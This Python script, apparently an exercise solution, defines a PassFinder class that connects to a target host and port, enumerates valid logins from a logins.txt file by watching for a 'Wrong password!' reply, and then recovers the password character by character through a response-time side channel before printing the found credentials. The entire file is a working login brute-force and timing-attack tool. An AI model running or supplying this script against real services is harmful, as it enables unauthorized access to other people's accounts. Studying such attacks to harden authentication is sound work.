from socket import socket
import json
from sys import argv
import itertools
from string import digits, ascii_letters
from datetime import datetime, timedelta


class PassFinder:
    characters = ascii_letters + digits
    file_path = r"...\logins.txt"

    def __init__(self, host, port):
        self.host = host
        self.port = int(port)

    # socket transmission
    def send_message(self, message, _sock):
        _sock.send(message.encode())

    def receive_message(self, _sock):
        return _sock.recv(1024).decode()

    # read file - login and password
    def read_file(self, _file):
        for line in _file:
            yield line.strip("\n")

    def open_file(self, file_name):
        try:
            file_to_open = open(file_name, 'r')
        except FileNotFoundError:
            print("The file does not exist!")
            file_to_open = False
        finally:
            return file_to_open

    # json transmission
    def send_message_json(self, message, _sock):
        self.send_message(json.dumps(message), _sock)

    def receive_message_json(self, _sock):
        message = self.receive_message(_sock)
        return json.loads(message)

    # generate login using typical logins from logins.txt file
    def generate_login(self, _login):
        combination = [{i.upper(), i.lower()} for i in _login]
        for i in itertools.product(*combination):
            yield ''.join(i)

    # generate password using typical passwords from passwords.txt file
    def generate_password_dict(self, _password):
        combination = [{i.upper(), i.lower()} for i in _password]
        for i in itertools.product(*combination):
            yield ''.join(i)

    # generate password by iterating through the lowercase letters and numbers (i in stage 1-3)
    def generate_password_brute(self, number_of_iter=1):
        # i = 1
        while True:
            for seq in itertools.product(self.characters, repeat=number_of_iter):
                yield "".join(seq)
            # i += 1

    def main(self):
        dict_login = {}
        file_login = self.open_file(self.file_path)
        with socket() as sock:
            sock.connect((self.host, self.port))
            login = ""
            password = ""
            answer = dict()
            if file_login:
                for i in self.read_file(file_login):
                    for j in self.generate_login(i):
                        dict_login.clear()
                        dict_login["login"] = j
                        dict_login["password"] = " "
                        self.send_message_json(dict_login, sock)
                        answer = self.receive_message_json(sock)
                        if answer["result"] == "Wrong password!":
                            login = j
                            break
                    if answer["result"] == "Wrong password!":
                        break
                for j in self.generate_password_brute(1):
                    dict_login.clear()
                    dict_login["login"] = login
                    dict_login["password"] = password + j
                    start = datetime.now()
                    self.send_message_json(dict_login, sock)
                    answer = self.receive_message_json(sock)
                    stop = datetime.now()
                    time_to = timedelta(0, 0.1)
                    if stop - start >= time_to:
                        password += j
                    if answer["result"] == "Connection success!":
                        print(json.dumps(dict_login))
                        break
            else:
                pass


if __name__ == "__main__":
    ip_address, address_port = argv[1:3]
    new_obj = PassFinder(ip_address, address_port)
    new_obj.main()
